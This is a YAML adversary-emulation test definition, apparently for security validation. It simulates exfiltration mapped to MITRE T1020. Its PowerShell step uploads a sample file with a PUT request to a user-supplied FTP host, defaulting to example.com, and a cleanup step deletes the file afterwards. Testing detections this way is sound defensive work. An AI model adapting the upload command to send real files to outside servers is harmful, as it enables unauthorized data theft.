api_version: "2.0"
name: Exfiltration via Encrypted FTP
description: Simulates encrypted file transfer to an FTP server. For testing purposes, a free FTP testing portal is available at https://sftpcloud.io/tools/free-ftp-server, providing a temporary FTP server for 60 minutes. Use this service responsibly for testing and validation only.
args:
    - name: ftpServer
      type: Url
      default: ftp://example.com
    - name: credentials
      type: String
      default: '[user:password]'
    - name: sampleFile
      type: String
      default: C:\temp\T1020__FTP_sample.txt
uuid: 5b380e96-b0ef-4072-8a8e-f194cb9eb9ac
mitre:
    tactics:
        - 'TA0010: Exfiltration'
    techniques:
        - 'T1020: Automated Exfiltration'
requirements:
    platforms:
        - os: windows
steps:
    - name: exfiltration-via-encrypted-ftp
      inline: |
        $sampleData = "Sample data for exfiltration test"
        Set-Content -Path "{{.Args.sampleFile}}" -Value $sampleData
        $ftpUrl = "{{.Args.ftpServer}}"
        $creds = Get-Credential -Credential "{{.Args.credentials}}"
        Invoke-WebRequest -Uri $ftpUrl -Method Put -InFile "{{.Args.sampleFile}}" -Credential $creds
      executor: powershell
      cleanup:
        inline: |
            Remove-Item -Path "{{.Args.sampleFile}}" -ErrorAction Ignore
        executor: powershell
